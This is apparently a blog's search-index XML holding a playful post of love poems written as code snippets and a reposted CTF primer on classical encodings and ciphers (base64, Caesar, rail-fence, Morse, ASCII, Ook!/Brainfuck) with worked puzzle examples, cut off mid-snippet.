<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>520-程序员的情书</title>
    <url>/article/a3f7b336.html</url>
    <content><![CDATA[<font size="4" face="FangSong_GB2312">
<p align="center">这几天不是520、521嘛,昨天光看项目去了,忘记写这个了</p>
<p align="center">但520错过了，521应该可以吧</p>
<p align="center">代码什么时候不能写</p>
<p align="center">技术什么时候不能学</p>
<p align="center">在这个"春光"灿烂的日子里</p>
<p align="center">...</p>

<p align="center">之前看到很多用代码写的情书，还挺感兴趣的</p>
<p align="center">谁说程序员就全是直男了</p>

<p align="center">下次表白，就直接甩代码，哈哈</p>
</font>
<font size="6" face="FangSong_GB2312">
<p align="center"><u><i>0x00</i></u></p></font>


<p class="note note-info" align="center">
    有一种爱叫做放手<br><br>
    当你不爱我时我会放手<br><br>
    然而我永远不会是那个先放手的人<br>
</p>

<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">bool youLoveMe=<span class="hljs-keyword">true</span>, iLoveYou=<span class="hljs-keyword">true</span>;<br><span class="hljs-keyword">while</span>( iLoveYou ) &#123;<br>	<span class="hljs-keyword">if</span>(!youLoveMe) &#123;<br>		iLoveYou = <span class="hljs-keyword">false</span>;<br>	&#125;<br>&#125;<br><span class="hljs-comment">//有一种爱叫做放手</span><br><span class="hljs-comment">//当你不爱我时我会放手</span><br><span class="hljs-comment">//然而我永远不会是那个先放手的人</span><br></code></pre></div></td></tr></table></figure>

<hr>

<font size="6" face="FangSong_GB2312">
<p align="center"><u><i>0x01</i></u></p></font>


<p class="note note-info" align="center">
    从前的日色变得慢<br><br>
    车，马，邮件都慢<br><br>
    一生只够爱一个人<br>
</p>

<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> beWithYou <span class="hljs-keyword">in</span> range( <span class="hljs-number">0</span>, <span class="hljs-number">60</span>*<span class="hljs-number">365</span> ):<br>	time.sleep( <span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span> )<br>//从前的日色变得慢<br>//车，马，邮件都慢<br>//一生只够爱一个人<br></code></pre></div></td></tr></table></figure>

<hr>

<font size="6" face="FangSong_GB2312">
<p align="center"><u><i>0x02</i></u></p></font>


<p class="note note-info" align="center">
    我爱你<br><br>
    雨女无瓜<br>
</p>

<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">do</span>&#123;<br>	i.love(&amp;you);<br>&#125; <span class="hljs-keyword">while</span>(you.love(&amp;me) || !you.love(&amp;me));<br><span class="hljs-comment">//我爱你</span><br><span class="hljs-comment">//雨女无瓜</span><br></code></pre></div></td></tr></table></figure>

<hr>


<font size="6" face="FangSong_GB2312">
<p align="center"><u><i>0x03</i></u></p></font>


<p class="note note-info" align="center">
    生活中总是出现这样那样的意外<br><br>
    只要我们携手面对<br><br>
    最终只会让我们爱的更深<br>
</p>

<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>	living();<br>&#125; <span class="hljs-keyword">catch</span> () &#123;<br>	faceTogether();<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>	ours.love++;<br>&#125;<br><span class="hljs-comment">//生活中总是出现这样那样的意外</span><br><span class="hljs-comment">//只要我们携手面对</span><br><span class="hljs-comment">//最终只会让我们爱的更深</span><br></code></pre></div></td></tr></table></figure>

<hr>

<font size="6" face="FangSong_GB2312">
<p align="center"><u><i>0x04</i></u></p></font>


<p class="note note-info" align="center">
    我和你原本就是两个世界的人<br><br>
    一直都在不停的向前走<br><br>
    直到有一天在某一刻相遇<br><br>
    我们才在彼此的世界里相拥<br><br>
    然后追寻着各自的梦想<br><br>
    却又活在我们自己的天空下<br><br>
    我要和你手牵着手共同的走下去<br><br>
    就像这跳不出的循环，直到永远<br>
</p>

<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">do</span> &#123;<br>	a++;<br>	b++;<br>&#125; <span class="hljs-keyword">while</span>(a&amp;b);<br><span class="hljs-comment">//我和你原本就是两个世界的人</span><br><span class="hljs-comment">//一直都在不停的向前走</span><br><span class="hljs-comment">//直到有一天在某一刻相遇</span><br><span class="hljs-comment">//我们才在彼此的世界里相拥</span><br><span class="hljs-comment">//然后追寻着各自的梦想</span><br><span class="hljs-comment">//却又活在我们自己的天空下</span><br><span class="hljs-comment">//我要和你手牵着手共同的走下去</span><br><span class="hljs-comment">//就像这跳不出的循环，直到永远</span><br></code></pre></div></td></tr></table></figure>

<hr>

<font size="6" face="FangSong_GB2312">
<p align="center"><u><i>0x05</i></u></p></font>


<p class="note note-info" align="center">
    宇宙再大，不过我和你<br><br>
    我爱你，直到时间的尽头<br>
</p>

<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">Universe*universe = <span class="hljs-keyword">new</span> Universe(<span class="hljs-string">"You"</span>, <span class="hljs-string">"Me"</span>);<br><span class="hljs-keyword">while</span>( !universe-&gt;endOfTime() ) &#123;<br>	<span class="hljs-built_in">std</span>::out &lt;&lt; <span class="hljs-string">"Love U Forever"</span> &lt;&lt; <span class="hljs-built_in">std</span>:<span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-comment">//宇宙再大，不过我和你</span><br><span class="hljs-comment">//我爱你，直到时间的尽头</span><br></code></pre></div></td></tr></table></figure>

<hr>

<font size="6" face="FangSong_GB2312">
<p align="center"><u><i>0x06</i></u></p></font>


<p class="note note-info" align="center">
    你爱或者不爱我<br><br>
    爱就在那里<br><br>
    不增不减<br>
</p>

<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span>( you.love(&amp;me) || !you.love(&amp;me) ) &#123;<br>	me.emotion.love.value ++;<br>	me.emotion.love.value --;<br>&#125;<br><span class="hljs-comment">//你爱或者不爱我</span><br><span class="hljs-comment">//爱就在那里</span><br><span class="hljs-comment">//不增不减</span><br></code></pre></div></td></tr></table></figure>

<hr>

<font size="6" face="FangSong_GB2312">
<p align="center"><u><i>0x07</i></u></p></font>


<p class="note note-info" align="center">
    在时间的长河里<br><br>
    多希望那些即使彼此没有遇见的日子<br><br>
    也能统统由我的爱相陪伴<br><br>
    让爱连接每一天<br>
</p>

<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> TimeRiver <span class="hljs-title">timeFlow</span><span class="hljs-params">( List&lt;DaysMeetYou&gt; days )</span> </span>&#123;<br>	<span class="hljs-keyword">return</span> (TimeRiver)days.stream()<br>		.filter( n-&gt;theDaysNotWithYou(n) )<br>		.map( e-&gt;accompanyByMyLove(e) )<br>		.collect( Collectors.joining(<span class="hljs-string">"❤"</span>) );<br>&#125;<br><span class="hljs-comment">//在时间的长河里</span><br><span class="hljs-comment">//多希望那些即使彼此没有遇见的日子</span><br><span class="hljs-comment">//也能统统由我的爱相陪伴</span><br><span class="hljs-comment">//让爱连接每一天</span><br></code></pre></div></td></tr></table></figure>

<hr>
<p align="center"><u><i>0x08</i></u></p></font>
<font size="4" face="FangSong_GB2312">


<p align="center">赶紧动起来，活学活用(u1s1,上面有的看得我都挺尴尬的)</p>
<p align="center">都学着点(滑稽)...</p>
<p align="center"><img src="https://qiniuyun.fxhstudy.com/640.png" srcset="/img/loading.gif"></p>
</font>
<br>

<!-- 
<h6 align="center"><img src="https://qiniuyun.fxhstudy.com/640.gif" srcset="/img/loading.gif"></h6> -->]]></content>
  </entry>
  <entry>
    <title>CTF密码学常见的加解密总结[转载]</title>
    <url>/article/f7911999.html</url>
    <content><![CDATA[<blockquote>
    原文链接:<a href="https://blog.csdn.net/qq_40836553/article/details/79383488" target="_blank" rel="noopener">https://blog.csdn.net/qq_40836553/article/details/79383488</a>
</blockquote>
<br>

<p>这几天在看CTF涉及到的有关密码学的知识，找到了一些视频资料，但是发现涉及的有点深了，所以这里转载了一篇关于CTF密码学的加密解密总结,不过好像没有涉及到md5。</p>
<a id="more"></a>


<article class="baidu_pl">
         <div id="article_content" class="article_content clearfix">
            <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-833878f763.css">
                            <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-833878f763.css">
                <div class="htmledit_views" id="content_views">
                </p><h4>1.base64编码</h4><p>&nbsp;<span style="font-size:14px;">&nbsp;&nbsp;&nbsp; Base64是网络上最常见的用于传输8Bit<a href="https://baike.baidu.com/item/%E5%AD%97%E8%8A%82%E7%A0%81" target="_blank" rel="nofollow noopener">字节码</a>的编码方式之一，base64就是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个比特为一个单元，对应某个可打印字符。三个字节有24个比特，对应4个base64单元，即3个字节可表示4个可打印字符。它可用来作为电子邮件的传输编码。在base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同系统中而不同。</span></p><p><span style="font-size:14px;"></span></p><div><span style="font-size:14px;">例如：编码‘Man'</span></div><div><img alt="" src="https://img-blog.csdn.net/20170721181142080?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcGRzdTE2MTUzMDI0Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" srcset="/img/loading.gif"><br></div><div><span style="font-size:14px;">在此例中，base64算法将3个字符编码转为4个字符</span></div><div><span style="font-size:14px;">base64索引表：</span></div><div><img alt="" src="https://img-blog.csdn.net/20170721181527589?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcGRzdTE2MTUzMDI0Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" srcset="/img/loading.gif"><br></div><div><span style="font-size:14px;">如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行base64的编码。在编码后的base64文本后加上一个或两个“=”号，代表补足的字节数。也就是说，当最后剩余一个八位字节（一个byte）时，最后6位的base64字节块有四位是0值，最后附加上两个等号；如果最后剩余两个八位字节（2byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号</span></div><div><span style="font-size:14px;">例如：</span></div><div><img alt="" src="https://img-blog.csdn.net/20170721182105652?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcGRzdTE2MTUzMDI0Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" srcset="/img/loading.gif"><br><span style="color:#CC66CC;">当看到==号的加密方式时，可以考虑base64。例：cTZ1NQ==解码之后为q5u5。</span><br></div><div><br></div><div><span style="font-size:12px;">关于base32：<br><span>base32中只有大写字母（A-Z）和数字234567</span></span><br></div><p><span style="font-size:14px;"><span style="font-size:12px;"><span><img alt="" src="https://img-blog.csdn.net/20170921171542852?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcGRzdTE2MTUzMDI0Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" srcset="/img/loading.gif"></span></span><br></span></p><p></p><div><span style="font-size:12px;"><span>关于base16：</span></span></div><div><span style="font-size:12px;">base16中只有数字0-9以及大写字母ABCDEF<br></span></div><div><span style="font-size:12px;"><img alt="" src="https://img-blog.csdn.net/20170921171647346?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcGRzdTE2MTUzMDI0Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" srcset="/img/loading.gif"><br></span></div><div><div><a href="http://blog.csdn.net/pdsu161530247/article/details/74840422" target="_blank" rel="noopener">用python3使用base64、base32、base16编码</a></div><a href="http://tool.chinaz.com/tools/base64.aspx" target="_blank" rel="nofollow noopener">base64在线解密</a>&nbsp;&nbsp; 摘自：<a href="http://blog.csdn.net/pdsu161530247/article/details/75667218" target="_blank" rel="noopener"> CTF中Crypty（密码类）入门必看 </a><br><h4>2.凯撒密码</h4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。现今又叫“移位密码”，只不过移动的位数不一定是3位而已。<br><div class="para">下面我们总结一下：</div><div class="para">明密对照表：</div><div class="para">明文：ABCDEFGHIJKLMNOPQRSTUVWXYZ</div><div class="para">密文：TUVWXYZABCDEFGHIJKLMNOPQRS</div><div class="para">注：广义上的凯撒是位移的。</div><div class="para">凯撒是没有密匙的，即使没有密匙也能将它破解出来，因为凯撒移位密码只有25种密匙，最多就是将这25种可能性挨个检测一下可以了，这就是我们所说的暴力破解法。也可在用软件破解，不过我提倡用人工的。</div>(有关凯撒密码的我了解还不是很详细，后续。。。）<br><h4>3.栅栏密码</h4>&nbsp;<div><span style="font-family:'微软雅黑', Times, serif;"><span style="font-family:'微软雅黑', Times, serif;"><span style="font-size:14px;">栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文，这里以2栏栅栏加密为例。</span></span></span></div><div><span style="font-family:'微软雅黑', 'Times New Roman', Times, serif;color:#222222;"><span style="font-family:'微软雅黑', Times, serif;"><span style="font-size:14px;"><br></span></span></span></div><div><span style="font-size:14px;">明文：The quick brown fox jumps over the lazy dog</span></div><div><span style="font-size:14px;"><br>去空格：Thequickbrownfoxjumpsoverthelazydog</span></div><div><span style="font-size:14px;"><br>分组：Th eq ui ck br ow nf ox ju mp so ve rt he la zy do g</span></div><div><span style="font-size:14px;"><br>第一组：Teucbonojmsvrhlzdg</span></div><div><span style="font-size:14px;"><br>第二组：hqikrwfxupoeteayo</span></div><div><span style="font-size:14px;"><br>密文：Teucbonojmsvrhlzdghqikrwfxupoeteayo<br></span></div><div><a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="nofollow noopener"><span style="font-size:14px;">在线栅栏密码解密链接</span></a></div>例：<span style="color:#CC66CC;"><span class="chal-desc"></span></span><p><span style="color:#CC66CC;">一只小羊翻过了2个栅栏KYsd3js2E{a2jda}解密后为KEY{sad23jjdsa2}</span></p><h4>4.摩斯密码</h4><span style="font-size:14px;">摩尔斯电码（英语：Morse code）是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。是由美国人艾尔菲德·维尔（Alfred Lewis Vail）与萨缪尔·摩尔斯（Samuel Finley Breese Morse）在1836年发明。<br>摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用0和1两种状态的二进制代码，它的代码包括五种：</span><p style="line-height:inherit;font-family:sans-serif;"><span style="font-size:14px;">1.点（.）</span></p><p style="line-height:inherit;font-family:sans-serif;"><span style="font-size:14px;">2.划（-）</span></p><p style="line-height:inherit;font-family:sans-serif;"><span style="font-size:14px;">3.每个字符间短的停顿（在点和划之间的停顿）</span></p><p style="line-height:inherit;font-family:sans-serif;"><span style="font-size:14px;">4.每个词之间中等的停顿</span></p><p style="line-height:inherit;font-family:sans-serif;"><span style="font-size:14px;">5.以及句子之间长的停顿</span></p><span style="font-size:14px;">摩尔斯电码字母与数字对应表：</span><div style="font-family:'Microsoft YaHei', '微软雅黑', '宋体', sans-serif;"><img alt="" src="https://img-blog.csdn.net/20170721202830370?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcGRzdTE2MTUzMDI0Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" srcset="/img/loading.gif"><br></div><div style="font-family:'Microsoft YaHei', '微软雅黑', '宋体', sans-serif;"><span style="font-size:14px;">例如：</span></div><div style="font-family:'Microsoft YaHei', '微软雅黑', '宋体', sans-serif;"><span style="font-size:14px;color:#CC66CC;">原文本：I LOVE YOU TOO&nbsp;</span></div><div style="font-family:'Microsoft YaHei', '微软雅黑', '宋体', sans-serif;"><span style="font-size:14px;color:#CC66CC;">加密后：<span style="font-family:'微软雅黑', sans-serif;"><strong>../.-../---/...-/./-.--/---/..-/-/---/---<br></strong></span></span><h3><a name="t1"></a><br></h3></div><h4>5.ASCII编码</h4><div><span style="font-size:14px;">ASCII码大致可以分为三部分组成：</span></div><div><span style="font-size:14px;">第一部分是：ASCII非打印控制字符</span></div><div><span style="font-size:14px;">第二部分是：ASCII打印字符；</span></div><div><span style="font-size:14px;">第三部分是：扩展ASCII打印字符。</span></div><div><a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="nofollow noopener"><span style="font-size:14px;">在线ASCII码与进制互相转换</span><br></a></div><div><img alt="" src="https://img-blog.csdn.net/20170721171817958?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcGRzdTE2MTUzMDI0Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" srcset="/img/loading.gif"><br></div><div><br></div><div>例：<p><span style="font-family:Lato, sans-serif;color:#CC33CC;"><span style="font-size:14px;">突然天上一道雷电gndk€rlqhmtkwwp}z分析<span style="font-family:Lato, sans-serif;font-size:14px;">gndk€rlqhmtkwwp}z这个格式有点像flag{*******}?</span><br></span></span></p><p><span style="font-family:Lato, sans-serif;color:#CC33CC;"><span style="font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;">我们比较一下"gndk"与"flag"的ASCII码</span></span></span></p><p><span style="font-family:Lato, sans-serif;color:#CC33CC;"><span style="font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;">gndk的10进制的ASCII码分别是：103 110 100 107</span></span></span></p><p><span style="color:#CC33CC;"><span style="font-family:Lato, sans-serif;"><span style="font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;">flag的<span style="font-family:Lato, sans-serif;font-size:14px;">10进制的</span><span style="font-family:Lato, sans-serif;font-size:14px;">ASCII码分别是&nbsp; ：102 108&nbsp; 97&nbsp; 103</span></span><br></span></span></span></span></p><p><span style="color:rgb(51,51,51);font-family:Lato, sans-serif;"><span style="font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="color:#CC33CC;">发现ASCII以此减少 1 2 3 4，所以以此类推解密得flag{lei_ci_jiami}</span></span></span></span></span></span></p><h3><a name="t2"></a><a name="t2"></a><span style="color:rgb(51,51,51);font-family:Lato, sans-serif;"><span style="font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="color:#CC33CC;"><span style="color:#333333;">6.Brainfuck/Ook!编码</span></span></span></span></span></span></span></h3><p><span style="color:rgb(51,51,51);font-family:Lato, sans-serif;"><span style="font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="color:#CC33CC;"><span style="color:#333333;">例：<span class="chal-desc"></span></span></span></span></span></span></span></span></p><p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?<br>Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook.<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. </p><span style="color:#CC33CC;">&nbsp;为Ook!编码，在线转文本后为flag{ok-ctf-1234-admin}</span></div><p><span style="color:rgb(51,51,51);font-family:Lato, sans-serif;"><span style="font-size:14px;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="font-family:Lato, sans-serif;font-size:14px;color:#333333;"><span style="color:#CC33CC;"><span style="color:#333333;"></span></span></span></span></span></span></span></p><div class="hljs code-wrapper"><pre class="hljs xml" name="code"><code class="hljs xml"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">+++++ +++++ [-&gt;++ +++++ +++<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> &gt;</span></span></span>++.+ +++++ .<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+++</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag"> [</span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>-- -<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>- -.+++ +++.<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span></span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-tag">++++[ </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">-</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span>+++ +<span class="hljs-tag"><span class="hljs-tag"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&gt;</span></span></span>+ +++.<span 